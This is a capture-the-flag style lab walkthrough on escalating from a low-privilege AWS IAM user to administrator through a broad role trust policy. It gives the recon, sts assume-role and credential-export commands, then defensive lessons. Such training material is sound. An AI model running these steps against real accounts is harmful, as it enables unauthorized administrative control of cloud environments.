# Guided Walkthrough: One-Hop Privilege Escalation via sts:AssumeRole

This scenario demonstrates a simple but critical privilege escalation vulnerability where a user can directly assume a role with administrator permissions. The attacker starts with minimal permissions but can assume a role that has the AWS-managed AdministratorAccess policy attached, instantly gaining full administrative privileges.

Direct role assumption is one of the most straightforward privilege escalation paths in AWS: no code needs to be deployed, no infrastructure modified, and no secondary services involved. A single API call is all it takes to go from a low-privilege IAM user to full administrator. This makes it both easy to exploit and easy to overlook in policy reviews, especially in environments where role trust policies are not regularly audited.

In real-world environments, this misconfiguration often arises from shortcuts during developer onboarding, CI/CD pipeline setup, or break-glass account design — where someone needed quick access to an administrative role and made the trust policy too broad, then forgot to restrict it afterward.

## The Challenge

You start as `pl-prod-sts-001-to-admin-starting-user` — a low-privilege IAM user with almost no permissions. Your target is `pl-prod-sts-001-to-admin-target-role`, an IAM role with the AWS-managed `AdministratorAccess` policy attached.

The vulnerability is in the role's trust policy: it allows `pl-prod-sts-001-to-admin-starting-user` to assume it directly without any additional conditions such as MFA or an external ID. One API call bridges the gap between no access and full administrator.

## Reconnaissance

First, let's confirm who you are and what you're working with.

```bash
export AWS_ACCESS_KEY_ID=<starting_user_access_key_id>
export AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>
unset AWS_SESSION_TOKEN

aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-sts-001-to-admin-starting-user
```

Try to do something administrative to confirm you don't have elevated access yet:

```bash
aws iam list-users --max-items 1
# An error occurred (AccessDenied) ...
```

Good — no admin access. Now let's look for roles you might be able to assume. With `iam:ListRoles` (a helpful permission this user has), you can enumerate available roles:

```bash
aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table
```

You'd spot `pl-prod-sts-001-to-admin-target-role` in the list. Checking its trust policy with `iam:GetRole` would confirm your user is trusted:

```bash
aws iam get-role --role-name pl-prod-sts-001-to-admin-target-role \
  --query 'Role.AssumeRolePolicyDocument'
```

The trust policy shows `pl-prod-sts-001-to-admin-starting-user` as an allowed principal with `sts:AssumeRole`. Time to exploit it.

## Exploitation

With the trust relationship confirmed, assume the role directly:

```bash
ASSUME_OUTPUT=$(aws sts assume-role \
  --role-arn "arn:aws:iam::{account_id}:role/pl-prod-sts-001-to-admin-target-role" \
  --role-session-name "sts-001-demo-session")

export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_OUTPUT" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$ASSUME_OUTPUT" | jq -r '.Credentials.SessionToken')
```

That's the entire attack. One call, no waiting, no intermediate steps.

## Verification

Confirm you're now operating as the admin role:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:assumed-role/pl-prod-sts-001-to-admin-target-role/sts-001-demo-session
```

And confirm administrator access:

```bash
aws iam list-users --max-items 3 --output table
# Returns a table of IAM users -- you now have full admin access
```

## What Happened

The entire attack chain consisted of a single API call: `sts:AssumeRole`. The starting user held an IAM policy granting `sts:AssumeRole` on the target role's ARN. The target role's trust policy permitted that user to assume it. AWS's STS service returned temporary credentials with full `AdministratorAccess` — no questions asked, no conditions enforced.

This is why trust policies on administrative roles need the same scrutiny as permission policies. Granting `sts:AssumeRole` on an admin role to any principal effectively grants that principal administrative access. CSPM tools should detect this as a privilege escalation path from the starting user's policy alone, before any exploitation ever occurs.
